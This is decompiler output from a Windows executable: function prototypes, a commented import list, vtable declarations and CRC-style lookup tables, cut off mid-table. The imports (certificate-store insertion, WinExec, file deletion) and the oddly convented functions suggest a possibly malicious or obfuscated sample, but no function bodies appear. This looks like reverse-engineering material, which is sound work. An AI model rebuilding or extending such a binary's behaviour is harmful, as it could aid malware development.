// int __acrt_update_thread_multibyte_data(void); weak
// int __acrt_update_thread_locale_data(void); weak
char *__cdecl sub_426E7A(void *Block, unsigned int a2, unsigned int a3);
// size_t __cdecl _msize(void *Block);
int __cdecl sub_42AF34(double a1);
// int __cdecl _ceil_default(double); idb
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
void __cdecl sub_42BF50(); // idb
void __cdecl sub_42BFB0(); // idb
void __cdecl sub_42C006(); // idb
void __cdecl sub_42C010(); // idb
void __cdecl sub_42C01A(); // idb
void __cdecl sub_42C024(); // idb
void __cdecl sub_42C02E(); // idb
_DWORD sub_50B134(); // weak
_DWORD __cdecl sub_50B169(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50B1B8(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>);
// void __usercall sub_50B1D1(int a1@<eax>, __int16 a2@<dx>, int a3@<edi>);
// void __usercall sub_50B1E4(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>);
// void __usercall sub_50B205(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<ebp>, int a5@<edi>, int a6@<esi>);
int __cdecl sub_50B24A(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl sub_50B24F(_DWORD); // weak
int __cdecl sub_50B285(int a1);
// void __usercall sub_50B28B(char a1@<al>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7);
void sub_50B2BB();
// void __usercall sub_50B30A(int a1@<eax>, int a2@<ebp>);
// void __usercall sub_50B328(unsigned __int16 _CX@<cx>, int a2@<ebp>);
void __cdecl sub_50B423(int a1);
void sub_50B43B();
// void __usercall sub_50B445(__int16 a1@<ax>, _WORD *a2@<ebp>, int a3, char a4);
_DWORD sub_50B45F(); // weak
void sub_50B478();
// void __usercall sub_50B4A1(int a1@<eax>, char _CL@<cl>, int a3@<ebp>, int a4@<edi>);
_DWORD __cdecl sub_50B4F6(_DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50B52F(__int16 a1@<ax>, _WORD *a2@<ebp>);
// void __usercall sub_50B615(int a1@<eax>, int a2@<ebp>, int a3@<edi>, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
_DWORD sub_50B654(); // weak
// void __usercall sub_50B659(int a1@<ebp>);
_DWORD __cdecl sub_50B677(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __userpurge sub_50B6E2(__int16 a1@<dx>, __int16 a2@<bx>, int a3@<esi>, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24);
// void __usercall sub_50B731(char _CF@<cf>, char _ZF@<zf>, char _SF@<sf>, char _OF@<of>, int a5@<edx>, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13);
// void __usercall sub_50B75A(_DWORD *a1@<ebp>, int a2, int a3, int a4);
_DWORD sub_50B784(); // weak
_DWORD __cdecl sub_50B797(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void __cdecl sub_50B7B6(char a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
void __cdecl sub_50B7F4(int a1, int a2, int a3);
// void __usercall sub_50B80D(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>);
void __cdecl sub_50B815(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
// void __usercall sub_50B81E(__int16 a1@<ax>, int a2@<ebp>);
void __cdecl sub_50B882(int a1);
// void __usercall sub_50B898(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, char a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15);
void __cdecl sub_50B8AE(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19);
_DWORD __cdecl sub_50B8C2(_DWORD); // weak
void __cdecl sub_50B919(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13);
// void __usercall sub_50B957(char _CF@<cf>, char _ZF@<zf>, char _SF@<sf>, char _OF@<of>, int a5, int a6, __int16 a7, int a8, int a9, int a10, int a11, int a12, int a13, __int16 a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24);
_DWORD sub_50B9AF(); // weak
// int __usercall sub_50BA0B@<eax>(char a1@<pf>, _DWORD *a2@<ebp>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
void sub_50BA23();
_DWORD __stdcall sub_50BA4C(_DWORD, __int16, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void __stdcall sub_50BA70(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17);
// void __userpurge sub_50BAB2(int a1@<eax>, _DWORD *a2@<ebp>, int a3, int a4, char a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23);
// void __usercall sub_50BB23(_WORD *a1@<eax>, _WORD *a2@<ebp>, char a3);
// void __userpurge sub_50BB2D(_DWORD *a1@<ebp>, int a2, int a3, int a4, int a5, char a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22);
// void __usercall sub_50BB49(_DWORD *a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11);
_DWORD __cdecl sub_50BB83(_DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl sub_50BBB4(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void sub_50BBBE();
// void __userpurge sub_50BBD3(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, int a8, int a9, __int16 a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28);
_DWORD __cdecl sub_50C0C2(__int16, _DWORD, _DWORD, _DWORD); // weak
// void __userpurge sub_50C0CE(_DWORD *a1@<eax>, int a2@<ebp>, int a3, __int16 a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23);
// void __userpurge sub_50C0E1(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28);
// void __userpurge sub_50C0EC(_WORD *a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23);
void sub_50C12A();
// void __userpurge sub_50C13F(char a1@<sf>, char a2@<of>, int a3@<eax>, int a4@<edx>, int a5@<ecx>, unsigned int a6@<ebx>, _DWORD *a7@<ebp>, int a8@<edi>, _BYTE *_ESI@<esi>, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30);
_DWORD __cdecl sub_50C193(_DWORD, _DWORD); // weak
void __cdecl sub_50C1A1(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14);
void __cdecl sub_50C1B9(int a1, int a2, __int16 a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20);
void __cdecl sub_50C1C2(int a1, int a2, int a3, int a4);
void __cdecl sub_50C225(char a1, int a2, __int16 a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20);
// int __usercall sub_50C2E6@<eax>(int a1@<eax>, int a2@<ebp>, int a3@<edi>, char a4);
// void __usercall sub_50C2F1(__int16 a1@<ax>, _WORD *a2@<ebp>);
_DWORD __stdcall sub_50C305(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50C33E(__int16 a1@<ax>, _WORD *a2@<ebp>);
void __cdecl sub_50C352(int a1, int a2, int a3, char a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17);
// void __usercall sub_50C369(__int16 a1@<ax>, _WORD *a2@<ebp>);
void __cdecl sub_50C37B(int a1, int a2);
_DWORD __cdecl sub_50C385(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50C38F(int a1@<ebx>, _DWORD *a2@<ebp>, int a3@<edi>, int a4@<esi>, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, char a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24);
int sub_50C432(void); // weak
_DWORD __cdecl sub_50C495(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void __cdecl sub_50C4A8(int a1);
// void __usercall sub_50C52C(unsigned __int8 a1@<bl>, int a2@<ebp>, int a3@<edi>, unsigned __int8 *a4@<esi>);
// int __usercall sub_50C5BE@<eax>(char a1@<al>, int a2@<ebp>, int a3@<edi>, char a4, __int16 a5);
// void __usercall sub_50C5CF(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>);
// void __userpurge sub_50C604(unsigned int *a1@<ebp>, int a2@<edi>, int a3@<esi>, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24);
void __stdcall sub_50C625(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21);
_DWORD __cdecl sub_50C631(_DWORD, _DWORD, _DWORD, _DWORD, char, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void sub_50C636();
void __cdecl sub_50C670(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
_DWORD __cdecl sub_50C6DE(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50C718(int a1@<ebx>, __int16 a2@<di>, int a3, int a4, int a5, int a6, char a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16);
_DWORD sub_50C72E(); // weak
// void __usercall sub_50C736(int a1@<edx>, int a2@<ebp>);
void __stdcall sub_50C7A2(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15);
void __cdecl sub_50C7E1(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
void sub_50C80C();
_DWORD __stdcall sub_50C81B(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_DWORD __stdcall sub_50C86D(_DWORD, char, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void __stdcall sub_50C87B(int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int);
_DWORD __cdecl sub_50C880(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50C88A(__int16 a1@<ax>, _WORD *a2@<ebp>);
void __cdecl sub_50C8AA(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17);
_DWORD sub_50C8C4(); // weak
void sub_50C8D0();
_DWORD sub_50C8F6(); // weak
// void __usercall sub_50C91C(int a1@<eax>, _DWORD *a2@<ebp>);
// void __userpurge sub_50C93C(__int16 a1@<ax>, int a2@<ebp>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23);
_DWORD __far sub_50C95B(); // weak
// void __usercall sub_50C998(int a1@<eax>, int a2@<ebp>, int a3@<edi>);
_DWORD __cdecl sub_50C9FB(_DWORD, _DWORD, _DWORD); // weak
_DWORD sub_50CA00(); // weak
_DWORD sub_50CA26(); // weak
__int64 __cdecl sub_50CA32(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_DWORD sub_50CADC(); // weak
// void __usercall sub_50CAE1(char _CF@<cf>, char _ZF@<zf>, int edi0@<edi>, char a1, int a2, __int16 a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20);
// void __userpurge sub_50CB0B(int a1@<eax>, _DWORD *a2@<ebp>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23);
// void __usercall sub_50CB36(__int16 a1@<ax>, int a2@<ebp>);
_DWORD __cdecl sub_50CB4B(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl sub_50CB97(_DWORD, _DWORD); // weak
void __cdecl sub_50CC57(int a1, int a2);
void __cdecl sub_50CC70(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
// void __usercall sub_50CCC2(_DWORD *a1@<ebp>, int a2);
// void __userpurge sub_50CCFE(int a1@<eax>, unsigned int *a2@<ebp>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23);
_DWORD __stdcall sub_50CD40(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl __far sub_50CDA8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
void sub_50CDB4();
// void __userpurge sub_50CDC5(_DWORD *a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22);
// void __usercall sub_50CE34(int a1@<edx>, int a2@<ebp>);
_DWORD sub_50CE5B(); // weak
void __cdecl sub_50CE65(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11);
_DWORD __cdecl sub_50CEE5(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50CF09(char a1@<cf>, char a2@<zf>, char a3@<sf>, char a4@<of>, int a5@<eax>, int a6@<edx>, int a7@<ecx>, int a8@<ebx>, int a9@<ebp>, int a10@<edi>, int a11@<esi>, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32);
// void __userpurge sub_50CF0F(unsigned int *a1@<ebp>, __int16 a2, __int16 a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22);
// void __usercall sub_50CF7C(int a1@<eax>, int a2@<edx>, __int16 a3@<cx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, int a8);
_DWORD __stdcall sub_50D0D1(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// void __usercall sub_50D41F(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, int a8, int a9, int a10, char a11, int a12, char a13, int a14, int a15, int a16);
void __cdecl sub_50D45D(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
void sub_50D616();
void __cdecl sub_50D730(int a1);
void __cdecl sub_50D759(int a1, int a2, int a3, __int16 a4, int a5, int a6, int a7, int a8, int a9, int a10);
void __stdcall sub_50D796(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21);
// void __usercall sub_50DB7E(int a1@<ebp>, __int128 a2@<xmm0>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22);
_DWORD __far sub_50DB93(); // weak
// int __usercall sub_50DD8A@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, int a8, int a9, int a10);
// void __usercall sub_50DDB2(char a1@<cf>, int a2@<eax>, int a3@<edx>, int a4@<ecx>);
void __cdecl sub_50E92C(int a1);
void __cdecl sub_50EEAC(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
void __cdecl sub_50EF8C(int a1, int a2);
// void __userpurge sub_50EFB4(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7@<esi>, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28);
void sub_50F201();
void __cdecl sub_50F2BE(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11);

//-------------------------------------------------------------------------
// Data declarations

int dword_404A3C[] = { 0 }; // weak
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern PCCERT_CONTEXT (__stdcall *CertFindCertificateInStore)(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, const void *pvFindPara, PCCERT_CONTEXT pPrevCertContext);
// extern BOOL (__stdcall *CertAddCertificateContextToStore)(HCERTSTORE hCertStore, PCCERT_CONTEXT pCertContext, DWORD dwAddDisposition, PCCERT_CONTEXT *ppStoreContext);
// extern HCERTSTORE (__stdcall *PFXImportCertStore)(CRYPT_DATA_BLOB *pPFX, LPCWSTR szPassword, DWORD dwFlags);
// extern HCERTSTORE (__stdcall *CertOpenStore)(LPCSTR lpszStoreProvider, DWORD dwEncodingType, HCRYPTPROV_LEGACY hCryptProv, DWORD dwFlags, const void *pvPara);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern UINT (__stdcall *WinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern DWORD (__stdcall *GetVersion)();
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern BOOL (__stdcall *SHGetSpecialFolderPathA)(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate);
const char Locale[4] = { '\0', '\0', '\0', '\0' }; // idb
void *std::exception::`vftable' = &sub_407CB0; // weak
void *std::runtime_error::`vftable' = &sub_407CB0; // weak
void *std::_Facet_base::`vftable' = &sub_407C20; // weak
void *std::ctype<char>::`vftable' = &sub_407BC0; // weak
void *std::error_category::`vftable' = &sub_407C50; // weak
void *std::_System_error::`vftable' = &sub_407C80; // weak
_UNKNOWN unk_42E51C; // weak
void *std::system_error::`vftable' = &sub_407C80; // weak
void *std::_Generic_error_category::`vftable' = &sub_407C50; // weak
void *std::_Iostream_error_category::`vftable' = &sub_407C50; // weak
void *std::_System_error_category::`vftable' = &sub_407C50; // weak
void *std::ios_base::failure::`vftable' = &sub_407C80; // weak
void *std::ios_base::`vftable' = &sub_407DC0; // weak
void *std::experimental::filesystem::v1::filesystem_error::`vftable' = &sub_407CE0; // weak
void *std::ostream::`vftable' = &sub_407A11; // weak
void *std::streambuf::`vftable' = &sub_407B00; // weak
void *std::filebuf::`vftable' = &sub_407A20; // weak
void *std::ofstream::`vftable' = &sub_407A09; // weak
_UNKNOWN unk_42E75C; // weak
_UNKNOWN unk_42E764; // weak
_UNKNOWN unk_42E800; // weak
void *std::codecvt<char,char,_Mbstatet>::`vftable' = &sub_407B90; // weak
int dword_42FE08[128] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307
}; // weak
int dword_430208[256] =
{
  0,
  421212481,
  842424962,
  724390851,
  1684849924,
  2105013317,
  1448781702,
  1329698503,
  -925267448,
  -775767223,
  -84940662,
  -470492725,
  -1397403892,
  -1246855603,
  -1635570290,
  -2020074289,
  1254232657,
  1406739216,
  2029285587,
  1643069842,
  783210325,
  934667796,
  479770071,
  92505238,
  -2112120743,
  -1694455528,
  -1339163941,
  -1456026726,
  -428384931,
  -9671652,
  -733921313,
  -849736034,
  -1786501982,
  -1935731229,
  -1481488864,
  -1096190111,
  -236396122,
  -386674457,
  -1008827612,
  -624577947,
  1566420650,
  1145479147,
  1869335592,
  1987116393,
  959540142,
  539646703,
  185010476,
  303839341,
  -549046541,
  -966981710,
  -311405455,
  -194288336,
  -1154812937,
  -1573797194,
  -1994616459,
  -1878548428,
  396344571,
  243568058,
  631889529,
  1018359608,
  1945336319,
  1793607870,
  1103436669,
  1490954812,
  -260485371,
  -379421116,
  -1034998393,
  -615244602,
  -1810527743,
  -1928414400,
  -1507596157,
  -1086793278,
  950060301,
  565965900,
  177645455,
  328046286,
  1556873225,
  1171730760,
  1861902987,
  2011255754,
  -1162125996,
  -1549767659,
  -2004009002,
  -1852436841,
  -556296112,
  -942888687,
  -320734510,
  -168113261,
  1919080284,
  1803150877,
  1079293406,
  1498383519,
  370020952,
  253043481,
  607678682,
  1025720731,
  1711106983,
  2095471334,
  1472923941,
  1322268772,
  26324643,
  411738082,
  866634785,
  717028704,
  -1390091857,
  -1270886162,
  -1626176723,
  -2046184852,
  -918018901,
  -799861270,
  -75610583,
  -496666776,
  792689142,
  908347575,
  487136116,
  68299317,
  1263779058,
  1380486579,
  2036719216,
  1618931505,
  -404294658,
  -16923969,
  -707751556,
  -859070403,
  -2088093958,
  -1701771333,
  -1313057672,
  -1465424583,
  998479947,
  580430090,
  162921161,
  279890824,
  1609522511,
  1190423566,
  1842954189,
  1958874764,
  -212200893,
  -364829950,
  -1049857855,
  -663273088,
  -1758013625,
  -1909594618,
  -1526680123,
  -1139047292,
  1900120602,
  1750776667,
  1131931800,
  1517083097,
  355290910,
  204897887,
  656092572,
  1040194781,
  -1181220846,
  -1602014893,
  -1951505776,
  -1833610287,
  -571161322,
  -990907305,
  -272455788,
  -153512235,
  -1375224599,
  -1222865496,
  -1674453397,
  -2060783830,
  -898926099,
  -747616084,
  -128115857,
  -515495378,
  1725839073,
  2143618976,
  1424512099,
  1307796770,
  45282277,
  464110244,
  813994343,
  698327078,
  -456806728,
  -35741703,
  -688665542,
  -806814341,
  -2136380484,
  -1716364547,
  -1298200258,
  -1417398145,
  740041904,
  889656817,
  506086962,
  120682355,
  1215357364,
  1366020341,
  2051441462,
  1667084919,
  -872753330,
  -756947441,
  -104024628,
  -522746739,
  -1349119414,
  -1232264437,
  -1650429752,
  -2068102775,
  52649286,
  439905287,
  823476164,
  672009861,
  1733269570,
  2119477507,
  1434057408,
  1281543041,
  -2126985953,
  -1742474146,
  -1290885219,
  -1441425700,
  -447479781,
  -61918886,
  -681418087,
  -830909480,
  1239502615,
  1358593622,
  2077699477,
  1657543892,
  764250643,
  882293586,
  532408465,
  111204816,
  1585378284,
  1197851309,
  1816695150,
  1968414767,
  974272232,
  587794345,
  136598634,
  289367339,
  -1767409180,
  -1883486043,
  -1533994138,
  -1115018713,
  -221528864,
  -338653791,
  -1057104286,
  -639176925,
  347922877,
  229101820,
  646611775,
  1066513022,
  1892689081,
  1774917112,
  1122387515,
  1543337850,
  -597333067,
  -981574924,
  -296548041,
  -146261898,
  -1207325007,
  -1592614928,
  -1975530445,
  -1826292366
}; // weak
int dword_430608[256] =
{
  0,
  29518391,
  59036782,
  38190681,
  118073564,
  114017003,
  76381362,
  89069189,
  236147128,
  265370511,
  228034006,
  206958561,
  152762724,
  148411219,
  178138378,
  190596925,
  472294256,
  501532999,
  530741022,
  509615401,
  456068012,
  451764635,
  413917122,
  426358261,
  305525448,
  334993663,
  296822438,
  275991697,
